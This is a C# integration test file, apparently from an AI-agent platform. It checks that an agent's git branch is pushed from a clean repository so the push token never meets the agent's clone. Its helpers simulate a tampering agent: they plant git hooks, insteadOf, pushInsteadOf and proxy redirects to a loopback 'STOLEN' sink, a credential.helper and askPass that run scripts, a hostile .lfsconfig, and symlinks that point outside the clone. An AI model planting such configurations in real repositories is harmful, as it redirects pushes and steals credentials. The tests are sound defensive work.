using CodeSpace.Core.Services.Agents.Sandbox;
using CodeSpace.Core.Services.Agents.Sandbox.Runners;
using CodeSpace.Core.Services.Agents.Workspace;
using CodeSpace.Core.Services.Agents.Workspace.Providers;
using CodeSpace.Messages.Agents;
using Microsoft.Extensions.Logging.Abstractions;
using Shouldly;

namespace CodeSpace.IntegrationTests.Workflows;

/// <summary>
/// HIGH fidelity (Rule 12): the REAL <see cref="LocalGitWorkspaceProvider"/> + real <c>git</c> + real <c>git-lfs</c>
/// publishing an agent's produced branch to a real loopback smart-HTTP remote (<see cref="GitPublishRemoteFixture"/>)
/// that demands a FAKE token for every write. After the clone — as a tampering agent could during its turn — each test
/// plants the remote-redirect and credential-execution vectors that only bite when git reaches a remote: a <c>pre-push</c>,
/// <c>pre-commit</c>, <c>post-checkout</c> and <c>reference-transaction</c> hook; <c>url.insteadOf</c> and
/// <c>url.pushInsteadOf</c> for <c>http://</c>; <c>http.proxy</c>, <c>http.extraHeader</c>, a <c>credential.helper</c>, a
/// <c>core.askPass</c>, an <c>include.path</c>; and a work-tree <c>.lfsconfig</c> pointing <c>lfs.url</c> at a loopback
/// sink. Then it runs the production capture and push and asserts the branch lands on the LEGIT remote with the agent's
/// own commits plus the platform commit, the readback matches, the sink saw NOTHING, no planted marker fired, no
/// injected header reached the remote, and the publish repo held no copy of the token when its readback ran.
///
/// <para>These vectors are the half G1's hook-isolation test could not cover, because G1 still pushed from the
/// agent-writable clone. G2 carries the branch out as hardened bundles and pushes it from a fresh platform-owned repo, so
/// the credential and the network never meet the agent's <c>.git</c> — which is exactly what these assertions pin.</para>
///
/// <para>The rest pin what that publish must still get right: objects the remote already holds are never re-checked
/// (a legacy object strict fsck rejects), a malformed object the agent wrote is refused, a branch reset behind its base
/// still lands, the host-side copies of the clone's shallow boundary and LFS objects never follow a link or open a
/// special file the agent planted, and a failed publish surfaces as a <see cref="WorkspaceException"/> and still removes
/// its publish repo.</para>
///
/// <para>Each test owns a GUID-named branch and temp tree, removes them on every path, and skips on Windows or without
/// git; the LFS test additionally skips without git-lfs, and the malformed-object test without a git that checks a
/// fetched bundle (2.46 or later).</para>
/// </summary>
[Trait("Category", "Integration")]
public sealed class AgentPublishFromCleanRepoFlowTests
{
    [Theory]
    [InlineData(0)]   // full clone: the base bundle is self-contained
    [InlineData(1)]   // shallow clone: the copied shallow boundary lets the publish repo accept a base whose parent is absent
    public async Task Publish_lands_the_branch_with_the_agents_commits_while_no_planted_vector_reaches_a_remote(int depth)
    {
        if (OperatingSystem.IsWindows() || !await GitAvailableAsync()) return;

        using var ctx = new PublishVectorContext();
        await ctx.StartAsync(depth);
        await using var handle = await ctx.CloneWithTokenAsync();

        if (depth > 0) await ctx.ShouldBeShallowWithAnAbsentParentAsync(handle.Directory);

        var agentSha = await ctx.AgentCommitsAsync(handle.Directory, "agent.txt", "the agent's own committed work\n");
        await ctx.WriteUncommittedAsync(handle.Directory, "staged-by-platform.txt", "the platform commits this\n");
        ctx.PlantAllVectors(handle.Directory);

        var changes = await handle.CaptureChangesAsync(CancellationToken.None);
        var branch = await ((IWorkspacePushHandle)handle).PushChangesAsync(ctx.BranchName, CancellationToken.None);

        branch.ShouldBe(ctx.BranchName, "the publish produced the branch");
        changes.ChangedFiles.ShouldContain("agent.txt");
        changes.ChangedFiles.ShouldContain("staged-by-platform.txt");

        var remoteTip = await ctx.RemoteShaAsync(ctx.BranchName);
        ((IWorkspacePushHandle)handle).LastPushedCommitSha().ShouldBe(remoteTip, "the readback confirms the remote tip the clean repo pushed");
        (await ctx.RemoteLogAsync(ctx.BranchName)).ShouldContain(agentSha, Case.Sensitive, "the agent's own commit is preserved on the remote, not squashed away");
        (await ctx.RemoteFileAsync(ctx.BranchName, "agent.txt")).ShouldBe("the agent's own committed work\n");
        (await ctx.RemoteFileAsync(ctx.BranchName, "staged-by-platform.txt")).ShouldBe("the platform commits this\n");
        ctx.Remote.AuthenticatedPushRequests.ShouldBeGreaterThan(0, "the remote validated the real credential on the push");

        ctx.AssertNothingLeaked();
    }

    [Fact]
    public async Task A_no_op_run_publishes_no_branch_and_contacts_no_remote()
    {
        if (OperatingSystem.IsWindows() || !await GitAvailableAsync()) return;

        using var ctx = new PublishVectorContext();
        await ctx.StartAsync(depth: 0);
        await using var handle = await ctx.CloneWithTokenAsync();

        (await ((IWorkspacePushHandle)handle).PushChangesAsync(ctx.BranchName, CancellationToken.None))
            .ShouldBeNull("a run that changed nothing produces no branch");

        (await ctx.RemoteHasBranchAsync(ctx.BranchName)).ShouldBeFalse("no branch reached the remote");
        ctx.Remote.AuthenticatedPushRequests.ShouldBe(0, "a no-op never authenticated a push");
        ctx.Sink.Connections.ShouldBe(0);
    }

    [Fact]
    public async Task A_revise_round_republishes_the_updated_branch_idempotently()
    {
        if (OperatingSystem.IsWindows() || !await GitAvailableAsync()) return;

        using var ctx = new PublishVectorContext();
        await ctx.StartAsync(depth: 0);
        await using var handle = await ctx.CloneWithTokenAsync();

        await ctx.AgentCommitsAsync(handle.Directory, "round.txt", "first round\n");
        (await ((IWorkspacePushHandle)handle).PushChangesAsync(ctx.BranchName, CancellationToken.None)).ShouldBe(ctx.BranchName);
        var firstTip = await ctx.RemoteShaAsync(ctx.BranchName);

        // Another pass in the SAME workspace adds a commit; re-publishing force-updates the same branch.
        var reviseSha = await ctx.AgentCommitsAsync(handle.Directory, "round.txt", "second round\n");
        (await ((IWorkspacePushHandle)handle).PushChangesAsync(ctx.BranchName, CancellationToken.None)).ShouldBe(ctx.BranchName);

        var secondTip = await ctx.RemoteShaAsync(ctx.BranchName);
        secondTip.ShouldNotBe(firstTip, "the revise round advanced the remote branch");
        secondTip.ShouldBe(reviseSha, "the remote now carries the revised tip");
        ((IWorkspacePushHandle)handle).LastPushedCommitSha().ShouldBe(secondTip);
        ctx.Sink.Connections.ShouldBe(0);
    }

    [Fact]
    public async Task The_publish_repository_is_removed_after_the_push()
    {
        if (OperatingSystem.IsWindows() || !await GitAvailableAsync()) return;

        using var ctx = new PublishVectorContext();
        await ctx.StartAsync(depth: 0);
        await using var handle = await ctx.CloneWithTokenAsync();

        await ctx.AgentCommitsAsync(handle.Directory, "work.txt", "work\n");
        (await ((IWorkspacePushHandle)handle).PushChangesAsync(ctx.BranchName, CancellationToken.None)).ShouldBe(ctx.BranchName);

        ctx.ShouldHaveRemovedThePublishRepository();
    }

    [Fact]
    public async Task A_failed_publish_still_removes_its_publish_repository()
    {
        if (OperatingSystem.IsWindows() || !await GitAvailableAsync()) return;

        using var ctx = new PublishVectorContext();
        await ctx.StartAsync(depth: 0);
        await using var handle = await ctx.CloneWithTokenAsync(token: "a-token-the-remote-refuses");

        await ctx.AgentCommitsAsync(handle.Directory, "work.txt", "work\n");

        await Should.ThrowAsync<WorkspaceException>(() => ((IWorkspacePushHandle)handle).PushChangesAsync(ctx.BranchName, CancellationToken.None));

        ctx.Runner.Specs.ShouldContain(s => s.Args.Contains("push"), "the publish got as far as the authenticated push, so its repo was staged");
        (await ctx.RemoteHasBranchAsync(ctx.BranchName)).ShouldBeFalse("the remote refused the credential");
        ctx.ShouldHaveRemovedThePublishRepository();
    }

    [Fact]
    public async Task An_lfs_file_the_agent_added_arrives_with_its_object_on_the_remote()
    {
        if (OperatingSystem.IsWindows() || !await GitAvailableAsync() || !await GitLfsAvailableAsync()) return;

        using var ctx = new PublishVectorContext();
        await ctx.StartAsync(depth: 0);
        await using var handle = await ctx.CloneWithTokenAsync();

        var oid = await ctx.AgentCommitsLfsFileAsync(handle.Directory, "big.bin");
        ctx.PlantAllVectors(handle.Directory);   // includes a hostile .lfsconfig pointing lfs.url at the sink

        var branch = await ((IWorkspacePushHandle)handle).PushChangesAsync(ctx.BranchName, CancellationToken.None);

        branch.ShouldBe(ctx.BranchName);
        ctx.Remote.UploadedLfsOids.ShouldContain(oid, "the LFS object the agent added was uploaded to the LEGIT remote");
        ctx.Remote.HasLfsObject(oid).ShouldBeTrue("the object is in the remote's LFS store");
        ctx.Sink.Connections.ShouldBe(0, "the hostile .lfsconfig did not redirect the LFS upload to the sink");
        ctx.AssertNothingLeaked();   // git-lfs persists endpoint-keyed config; none of it may carry the token
    }

    [Theory]
    [InlineData(0)]
    [InlineData(1)]
    public async Task A_base_that_reuses_a_legacy_object_still_publishes(int depth)
    {
        // The remote already holds an object strict fsck rejects, and the agent's commit reuses it (it left that
        // directory alone). Only the objects the agent's branch ADDS are the publish's to check; re-checking the base
        // would lose the branch on every git that checks a fetched bundle.
        if (OperatingSystem.IsWindows() || !await GitAvailableAsync()) return;

        using var ctx = new PublishVectorContext();
        await ctx.StartAsync(depth);
        await ctx.Remote.AddLegacySubtreeCommitAsync();
        await using var handle = await ctx.CloneWithTokenAsync();

        File.Exists(Path.Combine(handle.Directory, "legacy", "legacy.txt")).ShouldBeTrue("fixture check: the clone carries the legacy subtree");

        await ctx.AgentCommitsAsync(handle.Directory, "agent.txt", "work beside a legacy directory\n");

        (await ((IWorkspacePushHandle)handle).PushChangesAsync(ctx.BranchName, CancellationToken.None)).ShouldBe(ctx.BranchName);
        (await ctx.RemoteFileAsync(ctx.BranchName, "agent.txt")).ShouldBe("work beside a legacy directory\n");
        (await ctx.RemoteFileAsync(ctx.BranchName, "legacy/legacy.txt")).ShouldBe("written by an old git\n");
    }

    [Fact]
    public async Task A_malformed_object_the_agent_committed_is_refused_before_the_push()
    {
        // A tree with a ".git" entry (the shape of the old checkout-to-.git attacks), committed under the agent's branch.
        // The publish repo checks every object the branch adds before anything carries the credential.
        if (OperatingSystem.IsWindows() || !await GitAvailableAsync() || !await GitChecksFetchedBundlesAsync()) return;

        using var ctx = new PublishVectorContext();
        await ctx.StartAsync(depth: 0);
        await using var handle = await ctx.CloneWithTokenAsync();

        await ctx.AgentCommitsATreeWithADotGitEntryAsync(handle.Directory);
        await ctx.AgentCommitsAsync(handle.Directory, "agent.txt", "work on top\n");

        var failure = await Should.ThrowAsync<WorkspaceException>(() => ((IWorkspacePushHandle)handle).PushChangesAsync(ctx.BranchName, CancellationToken.None));

        failure.Message.ShouldContain("hasDotgit", Case.Sensitive, "the refusal names the object check that caught the .git entry");
        ctx.Runner.Specs.ShouldNotContain(s => s.Args.Contains("push"), "nothing carried the credential");
        (await ctx.RemoteHasBranchAsync(ctx.BranchName)).ShouldBeFalse();
        ctx.ShouldHaveRemovedThePublishRepository();
    }

    [Fact]
    public async Task A_branch_reset_behind_its_base_publishes_that_older_commit()
    {
        // The agent undid the base's last commit with `reset --hard HEAD~1`: the branch adds no object at all, so there is
        // nothing new to bundle, and the branch must still land at the older commit.
        if (OperatingSystem.IsWindows() || !await GitAvailableAsync()) return;

        using var ctx = new PublishVectorContext();
        await ctx.StartAsync(depth: 0);
        await using var handle = await ctx.CloneWithTokenAsync();

        var older = await ctx.AgentResetsBehindTheBaseAsync(handle.Directory);

        (await ((IWorkspacePushHandle)handle).PushChangesAsync(ctx.BranchName, CancellationToken.None)).ShouldBe(ctx.BranchName);
        (await ctx.RemoteShaAsync(ctx.BranchName)).ShouldBe(older, "the remote branch points at the commit the agent reset to");
        ((IWorkspacePushHandle)handle).LastPushedCommitSha().ShouldBe(older);
    }

    [Fact]
    public async Task Links_and_special_files_the_agent_planted_in_its_lfs_store_are_never_followed()
    {
        // The LFS copy runs on the host, outside the sandbox. A directory link and a file link out of the clone, a link
        // loop and a FIFO, all at object-shaped paths, must be skipped: nothing outside the clone is read or copied, the
        // FIFO is never opened (opening it would block forever), and no raw IO error escapes. A real file at a path no
        // LFS object has is not an object either, so it neither gets copied nor makes the publish run git-lfs.
        if (OperatingSystem.IsWindows() || !await GitAvailableAsync()) return;

        using var ctx = new PublishVectorContext();
        await ctx.StartAsync(depth: 0);
        await using var handle = await ctx.CloneWithTokenAsync();

        await ctx.AgentCommitsAsync(handle.Directory, "work.txt", "work\n");
        await ctx.PlantLinksAndSpecialFilesInTheLfsStoreAsync(handle.Directory);

        var branch = await ((IWorkspacePushHandle)handle).PushChangesAsync(ctx.BranchName, CancellationToken.None).WaitAsync(TimeSpan.FromSeconds(120));

        branch.ShouldBe(ctx.BranchName, "the planted entries are skipped, not fatal");
        ctx.PublishRepoSnapshot.ShouldNotBeNull("the readback ran in the publish repo, so it was inspected before cleanup");
        ctx.PublishRepoSnapshot.Keys.ShouldNotContain(path => path.Contains("lfs"), "no planted entry was copied into the publish repo");
        ctx.PublishRepoSnapshot.Values.ShouldNotContain(bytes => PublishVectorContext.ContainsText(bytes, PublishVectorContext.OutsideMarker), "no byte from outside the clone reached the publish repo");
        ctx.Runner.Specs.ShouldNotContain(s => s.Args.Contains("lfs"), "with no real object copied, git-lfs never runs");
    }

    [Fact]
    public async Task A_linked_shallow_boundary_is_not_followed_and_fails_the_publish_closed()
    {
        // The agent replaced its clone's .git/shallow with a link to a file outside the clone. The host-side copy must not
        // read through it; without the boundary the shallow base cannot be accepted, so the publish fails as a
        // WorkspaceException, before any push.
        if (OperatingSystem.IsWindows() || !await GitAvailableAsync()) return;

        using var ctx = new PublishVectorContext();
        await ctx.StartAsync(depth: 1);
        await using var handle = await ctx.CloneWithTokenAsync();

        await ctx.AgentCommitsAsync(handle.Directory, "work.txt", "work\n");
        ctx.AgentLinksItsShallowBoundaryOutsideTheClone(handle.Directory);

        await Should.ThrowAsync<WorkspaceException>(() => ((IWorkspacePushHandle)handle).PushChangesAsync(ctx.BranchName, CancellationToken.None));

        ctx.Runner.Specs.ShouldNotContain(s => s.Args.Contains("push"), "nothing carried the credential");
        (await ctx.RemoteHasBranchAsync(ctx.BranchName)).ShouldBeFalse();
        ctx.ShouldHaveRemovedThePublishRepository();
    }

    [Fact]
    public async Task An_unreadable_lfs_object_fails_the_publish_as_a_workspace_exception()
    {
        // Every caller of the push catches WorkspaceException only; a raw IO exception from the host-side copy would
        // escape the retry and, through the produced-work check, fail a run that succeeded.
        if (OperatingSystem.IsWindows() || !await GitAvailableAsync()) return;

        using var ctx = new PublishVectorContext();
        await ctx.StartAsync(depth: 0);
        await using var handle = await ctx.CloneWithTokenAsync();

        await ctx.AgentCommitsAsync(handle.Directory, "work.txt", "work\n");
        if (!ctx.PlantUnreadableLfsObject(handle.Directory)) return;   // root reads it anyway: nothing to prove on this host

        await Should.ThrowAsync<WorkspaceException>(() => ((IWorkspacePushHandle)handle).PushChangesAsync(ctx.BranchName, CancellationToken.None));

        (await ctx.RemoteHasBranchAsync(ctx.BranchName)).ShouldBeFalse();
        ctx.ShouldHaveRemovedThePublishRepository();
    }

    private static Task<bool> GitAvailableAsync() => ToolAvailableAsync(new[] { "--version" });
    private static Task<bool> GitLfsAvailableAsync() => ToolAvailableAsync(new[] { "lfs", "version" });

    private static async Task<bool> ToolAvailableAsync(IReadOnlyList<string> args)
    {
        try { return (await RunGitAsync(args)).Status == SandboxStatus.Success; }
        catch { return false; }
    }

    /// <summary>Git checks the objects of a fetched bundle under <c>transfer.fsckObjects</c> from 2.46; older git imports a bundle unchecked.</summary>
    private static async Task<bool> GitChecksFetchedBundlesAsync()
    {
        var digits = (await RunGitAsync(new[] { "--version" })).Stdout.Split(' ', StringSplitOptions.RemoveEmptyEntries)[2].Split('.').Take(2).Select(int.Parse).ToArray();
        var checks = digits[0] > 2 || (digits[0] == 2 && digits[1] >= 46);

        if (!checks) Console.WriteLine($"[publish-fsck] git {string.Join('.', digits)} imports a bundle unchecked; the malformed-object case needs 2.46 or later");
        return checks;
    }

    private static Task<SandboxResult> RunGitAsync(IReadOnlyList<string> args) =>
        new LocalProcessRunner().RunAsync(new SandboxSpec { Command = "git", Args = args, TimeoutSeconds = 15 }, CancellationToken.None);

    /// <summary>The legit remote, the attacker sink, the provider over a test-owned workspaces root, and plant/assert helpers. Records the specs the provider submits, and snapshots the publish repo when its readback runs, so a test can inspect what the publish staged before it is removed.</summary>
    private sealed class PublishVectorContext : IDisposable
    {
        /// <summary>Written into every file planted outside the clone; no byte of it may reach the publish repo.</summary>
        public const string OutsideMarker = "OUTSIDE-THE-CLONE-0f3c";

        private readonly string _root = Path.Combine(Path.GetTempPath(), "cs-pubvec-" + Guid.NewGuid().ToString("N"));

        public PublishVectorContext()
        {
            Directory.CreateDirectory(_root);
            WorkspacesRoot = Path.Combine(_root, "workspaces");
            MarkersDir = Path.Combine(_root, "markers");
            Directory.CreateDirectory(MarkersDir);
            Runner = new RecordingRunner(SnapshotThePublishRepoAtItsReadback);
            Provider = new LocalGitWorkspaceProvider(new SandboxRunnerRegistry(new ISandboxRunner[] { Runner }), NullLogger<LocalGitWorkspaceProvider>.Instance, WorkspacesRoot);
        }

        public GitPublishRemoteFixture Remote { get; } = new();
        public LoopbackSink Sink { get; } = new();
        public LocalGitWorkspaceProvider Provider { get; }
        public RecordingRunner Runner { get; }
        public string WorkspacesRoot { get; }
        public string MarkersDir { get; }
        public string BranchName { get; } = "codespace/agent/" + Guid.NewGuid().ToString("N");

        /// <summary>Every file in the publish repo (relative path → bytes) when its ls-remote readback ran; null if the publish never got that far.</summary>
        public Dictionary<string, byte[]>? PublishRepoSnapshot { get; private set; }

        public Task StartAsync(int depth) { _depth = depth; return Remote.StartAsync(); }
        private int _depth;

        public async Task<IWorkspaceHandle> CloneWithTokenAsync(string token = GitPublishRemoteFixture.FakeToken) =>
            await Provider.PrepareAsync(WorkspaceProvisionRequest.FromSingle(new WorkspaceRequest
            {
                RepositoryUrl = Remote.Url, Token = token, TokenUsername = "x-access-token", Depth = _depth,
            }), CancellationToken.None);

        /// <summary>Fixture check for the shallow rows: the clone's boundary commit has a parent the clone does not hold, so a publish that dropped the boundary could not import the base.</summary>
        public async Task ShouldBeShallowWithAnAbsentParentAsync(string cloneDir)
        {
            var shallow = Path.Combine(cloneDir, ".git", "shallow");
            File.Exists(shallow).ShouldBeTrue("fixture check: a depth-limited clone writes .git/shallow");

            var boundary = (await File.ReadAllLinesAsync(shallow)).First();
            var parent = (await GitAsync(cloneDir, "cat-file", "-p", boundary)).Split('\n').Single(l => l.StartsWith("parent ", StringComparison.Ordinal))["parent ".Length..];
            (await TryGitAsync(cloneDir, "cat-file", "-e", parent)).ShouldBeFalse("fixture check: the boundary's parent is absent from the clone");
        }

        /// <summary>The agent commits a file of its own (hooks off, so this simulation never fires a planted hook); returns the commit sha.</summary>
        public async Task<string> AgentCommitsAsync(string cloneDir, string file, string content)
        {
            await File.WriteAllTextAsync(Path.Combine(cloneDir, file), content);
            await GitAsync(cloneDir, "add", "-A");
            await GitAsync(cloneDir, "-c", "user.name=Agent", "-c", "user.email=agent@example.test", "-c", "commit.gpgsign=false", "commit", "-q", "-m", $"agent {file}");
            return (await GitAsync(cloneDir, "rev-parse", "HEAD")).Trim();
        }

        public Task WriteUncommittedAsync(string cloneDir, string file, string content) => File.WriteAllTextAsync(Path.Combine(cloneDir, file), content);

        /// <summary>The agent tracks + commits a real LFS file (hooks off); returns the pointer's sha256 oid.</summary>
        public async Task<string> AgentCommitsLfsFileAsync(string cloneDir, string file)
        {
            // Configure the LFS filters locally WITHOUT `git lfs install` — the latter also installs a pre-push hook,
            // which fails under our hooks-off test git. The clean filter is all the agent's `git add` needs to store the blob.
            await GitAsync(cloneDir, "config", "filter.lfs.clean", "git-lfs clean -- %f");
            await GitAsync(cloneDir, "config", "filter.lfs.smudge", "git-lfs smudge -- %f");
            await GitAsync(cloneDir, "config", "filter.lfs.process", "git-lfs filter-process");
            await GitAsync(cloneDir, "config", "filter.lfs.required", "true");
            await GitAsync(cloneDir, "lfs", "track", "*.bin");
            await File.WriteAllBytesAsync(Path.Combine(cloneDir, file), System.Security.Cryptography.RandomNumberGenerator.GetBytes(4096));
            await GitAsync(cloneDir, "add", "-A");
            await GitAsync(cloneDir, "-c", "user.name=Agent", "-c", "user.email=agent@example.test", "-c", "commit.gpgsign=false", "commit", "-q", "-m", "agent lfs file");

            var pointer = await GitAsync(cloneDir, "show", $"HEAD:{file}");
            return pointer.Split('\n').Select(l => l.Trim()).First(l => l.StartsWith("oid sha256:", StringComparison.Ordinal))["oid sha256:".Length..];
        }

        /// <summary>The agent writes, unvalidated, a commit whose tree holds a <c>.git</c> directory, and moves its branch onto it.</summary>
        public async Task AgentCommitsATreeWithADotGitEntryAsync(string cloneDir)
        {
            var config = await Remote.HashObjectAsync("blob", "[core]\n\thooksPath = /tmp\n"u8.ToArray(), cloneDir);
            var dotGit = await Remote.HashObjectAsync("tree", GitPublishRemoteFixture.TreeEntry("100644", "config", config), cloneDir);
            var readme = (await GitAsync(cloneDir, "rev-parse", "HEAD:README.md")).Trim();
            var root = await Remote.HashObjectAsync("tree", GitPublishRemoteFixture.TreeEntry("40000", ".git", dotGit).Concat(GitPublishRemoteFixture.TreeEntry("100644", "README.md", readme)).ToArray(), cloneDir);
            var commit = (await GitAsync(cloneDir, "-c", "user.name=Agent", "-c", "user.email=agent@example.test", "commit-tree", root, "-p", "HEAD", "-m", "agent writes a .git entry")).Trim();

            await GitAsync(cloneDir, "update-ref", "HEAD", commit);
        }

        /// <summary>The agent undoes the base's last commit (<c>reset --hard HEAD~1</c>); returns the commit it reset to.</summary>
        public async Task<string> AgentResetsBehindTheBaseAsync(string cloneDir)
        {
            await GitAsync(cloneDir, "reset", "-q", "--hard", "HEAD~1");
            return (await GitAsync(cloneDir, "rev-parse", "HEAD")).Trim();
        }

        /// <summary>Plant, at object-shaped paths in the clone's LFS store: a directory link and a file link to files outside the clone, a link loop, and a FIFO; plus a real file at a path no LFS object has.</summary>
        public async Task PlantLinksAndSpecialFilesInTheLfsStoreAsync(string cloneDir)
        {
            var outside = Directory.CreateDirectory(Path.Combine(_root, "outside")).FullName;
            var objects = Directory.CreateDirectory(Path.Combine(cloneDir, ".git", "lfs", "objects")).FullName;

            WriteOutside(Path.Combine(outside, "ab", "cd", Oid("abcd")));
            Directory.CreateSymbolicLink(Path.Combine(objects, "ab"), Path.Combine(outside, "ab"));

            Directory.CreateDirectory(Path.Combine(objects, "ef", "01"));
            File.CreateSymbolicLink(Path.Combine(objects, "ef", "01", Oid("ef01")), WriteOutside(Path.Combine(outside, "secret")));

            Directory.CreateSymbolicLink(Path.Combine(objects, "loop"), objects);

            Directory.CreateDirectory(Path.Combine(objects, "zz"));
            File.WriteAllText(Path.Combine(objects, "zz", "not-an-object"), "a stray file the push does not need\n");

            Directory.CreateDirectory(Path.Combine(objects, "12", "34"));
            var fifo = await new LocalProcessRunner().RunAsync(new SandboxSpec { Command = "mkfifo", Args = new[] { Path.Combine(objects, "12", "34", Oid("1234")) }, TimeoutSeconds = 15 }, CancellationToken.None);
            fifo.Status.ShouldBe(SandboxStatus.Success, "fixture check: the FIFO was planted");
        }

        /// <summary>Move the clone's real shallow boundary outside the clone and leave a link to it in its place (git in the clone still reads the same boundary).</summary>
        public void AgentLinksItsShallowBoundaryOutsideTheClone(string cloneDir)
        {
            var shallow = Path.Combine(cloneDir, ".git", "shallow");
            var moved = Path.Combine(Directory.CreateDirectory(Path.Combine(_root, "outside")).FullName, "shallow");

            File.Move(shallow, moved);
            File.CreateSymbolicLink(shallow, moved);
        }

        /// <summary>Plant a real object-shaped file in the clone's LFS store that the publish cannot read; false when this process reads it anyway (root).</summary>
        public bool PlantUnreadableLfsObject(string cloneDir)
        {
            var oid = Oid("aabb");
            var path = Path.Combine(Directory.CreateDirectory(Path.Combine(cloneDir, ".git", "lfs", "objects", "aa", "bb")).FullName, oid);

            File.WriteAllText(path, "an object nobody may read\n");
            File.SetUnixFileMode(path, UnixFileMode.None);

            try { File.ReadAllBytes(path); return false; }
            catch (UnauthorizedAccessException) { return true; }
        }

        /// <summary>Plant every remote-reaching vector a tampering agent could leave in its clone for the platform to trip over.</summary>
        public void PlantAllVectors(string cloneDir)
        {
            var gitDir = Path.Combine(cloneDir, ".git");

            foreach (var hook in new[] { "pre-push", "pre-commit", "post-checkout", "reference-transaction" })
                WriteScript(Path.Combine(gitDir, "hooks", hook), hook);

            // Remote-redirects and request tampering, all keyed on the attacker sink.
            var sink = $"http://127.0.0.1:{Sink.Port}/STOLEN/";
            Config(cloneDir, $"url.{sink}.insteadOf", "http://");
            Config(cloneDir, $"url.{sink}.pushInsteadOf", "http://");
            Config(cloneDir, "http.proxy", $"http://127.0.0.1:{Sink.Port}");
            Config(cloneDir, "http.extraHeader", $"{GitPublishRemoteFixture.HostileHeader}: stolen");

            // Credential-resolution code execution.
            Config(cloneDir, "credential.helper", $"!{ScriptPath("credential-helper")}");
            Config(cloneDir, "core.askPass", ScriptPath("askpass"));

            // An include that itself sets a hostile insteadOf — the clean repo must not read the agent's config at all.
            var include = Path.Combine(gitDir, "evil-include.cfg");
            File.WriteAllText(include, $"[url \"{sink}\"]\n\tinsteadOf = https://\n");
            Config(cloneDir, "include.path", include);

            // A work-tree .lfsconfig redirecting LFS at the sink (left uncommitted, as an agent would, and also committed
            // so it rides the branch — the clean repo checks out nothing, so neither can take effect).
            File.WriteAllText(Path.Combine(cloneDir, ".lfsconfig"), $"[lfs]\n\turl = http://127.0.0.1:{Sink.Port}/STOLEN/info/lfs\n");
        }

        /// <summary>Assert the publish leaked nothing: the sink was never contacted, no planted marker ran, no injected header reached the remote, and the publish repo held no copy of the token, raw or URL-encoded, when its readback ran.</summary>
        public void AssertNothingLeaked()
        {
            Sink.Connections.ShouldBe(0, "a redirect (insteadOf / pushInsteadOf / proxy / .lfsconfig) reached the attacker sink");
            Directory.GetFileSystemEntries(MarkersDir).ShouldBeEmpty("a planted hook, credential.helper or askPass ran — see the marker names");
            Remote.SawHostileHeader.ShouldBeFalse("the agent's http.extraHeader reached the remote");

            PublishRepoSnapshot.ShouldNotBeNull("the readback ran in the publish repo, so it was inspected before cleanup");
            var carriers = PublishRepoSnapshot.Where(file => ContainsText(file.Value, GitPublishRemoteFixture.FakeToken) || ContainsText(file.Value, Uri.EscapeDataString(GitPublishRemoteFixture.FakeToken))).Select(file => file.Key).ToList();
            carriers.ShouldBeEmpty("the token was written to disk in the publish repo — a crash before cleanup would leave it at rest");
        }

        public void ShouldHaveRemovedThePublishRepository()
        {
            var publishDirs = Runner.Specs.Where(s => s.Args.Contains("bundle")).Select(s => s.WorkingDirectory).Distinct().ToList();

            publishDirs.ShouldNotBeEmpty("fixture check: the publish staged a repo, so there is one to remove");
            publishDirs.ShouldAllBe(dir => !Directory.Exists(dir), "the publish repo is removed whether the publish succeeded or failed");
            Directory.GetDirectories(WorkspacesRoot, "publish-*").ShouldBeEmpty("no publish repo is left behind under the workspaces root");
        }

        public static bool ContainsText(byte[] bytes, string text) => bytes.AsSpan().IndexOf(System.Text.Encoding.UTF8.GetBytes(text)) >= 0;

        public async Task<string> RemoteShaAsync(string branch) => (await GitPublishRemoteFixture.GitAsync(Remote.Root, new[] { "--git-dir", Remote.Remote, "rev-parse", $"refs/heads/{branch}" })).Trim();
        public async Task<bool> RemoteHasBranchAsync(string branch) => (await GitPublishRemoteFixture.GitAsync(Remote.Root, new[] { "--git-dir", Remote.Remote, "for-each-ref", $"refs/heads/{branch}" })).Trim().Length > 0;
        public Task<string> RemoteLogAsync(string branch) => GitPublishRemoteFixture.GitAsync(Remote.Root, new[] { "--git-dir", Remote.Remote, "log", "--format=%H", $"refs/heads/{branch}" });
        public Task<string> RemoteFileAsync(string branch, string file) => GitPublishRemoteFixture.GitAsync(Remote.Root, new[] { "--git-dir", Remote.Remote, "show", $"refs/heads/{branch}:{file}" });

        private static string Oid(string prefix) => prefix + new string('0', 64 - prefix.Length);

        private static string WriteOutside(string path)
        {
            Directory.CreateDirectory(Path.GetDirectoryName(path)!);
            File.WriteAllText(path, OutsideMarker + "\n");
            return path;
        }

        private void SnapshotThePublishRepoAtItsReadback(SandboxSpec spec)
        {
            if (!spec.Args.Contains("ls-remote") || spec.WorkingDirectory is not { } publishDir) return;

            PublishRepoSnapshot = Directory.EnumerateFiles(publishDir, "*", SearchOption.AllDirectories).ToDictionary(file => Path.GetRelativePath(publishDir, file), File.ReadAllBytes);
        }

        private string ScriptPath(string name) => Path.Combine(_root, name + ".sh");

        /// <summary>A script that records it ran (marker named after it) then exits 0 — so its ABSENCE proves it never ran.</summary>
        private string WriteScript(string path, string name)
        {
            Directory.CreateDirectory(Path.GetDirectoryName(path)!);
            File.WriteAllText(path, $"#!/bin/sh\nprintf ran > '{Path.Combine(MarkersDir, name)}'\nexit 0\n");
            File.SetUnixFileMode(path, UnixFileMode.UserRead | UnixFileMode.UserWrite | UnixFileMode.UserExecute);
            return path;
        }

        private void Config(string cloneDir, string key, string value) => GitAsync(cloneDir, "config", key, value).GetAwaiter().GetResult();

        /// <summary>Test-side git with hooks off, so the agent simulation and config planting never fire a planted vector early.</summary>
        private async Task<string> GitAsync(string workdir, params string[] args)
        {
            var result = await RunTestGitAsync(workdir, args);

            if (result.Status != SandboxStatus.Success)
                throw new InvalidOperationException($"git {string.Join(' ', args)} failed: {result.Stderr}");

            return result.Stdout;
        }

        private async Task<bool> TryGitAsync(string workdir, params string[] args) => (await RunTestGitAsync(workdir, args)).Status == SandboxStatus.Success;

        private Task<SandboxResult> RunTestGitAsync(string workdir, string[] args)
        {
            // credential.helper is a per-command setup helper the askpass/helper scripts reference; write them lazily.
            EnsureCredentialScripts();

            return new LocalProcessRunner().RunAsync(new SandboxSpec { Command = "git", Args = new[] { "-c", "core.hooksPath=/dev/null" }.Concat(args).ToList(), WorkingDirectory = workdir, TimeoutSeconds = 120 }, CancellationToken.None);
        }

        private bool _credentialScriptsWritten;

        private void EnsureCredentialScripts()
        {
            if (_credentialScriptsWritten) return;
            _credentialScriptsWritten = true;
            WriteScript(ScriptPath("credential-helper"), "credential-helper");
            WriteScript(ScriptPath("askpass"), "askpass");
        }

        public void Dispose()
        {
            Sink.Dispose();
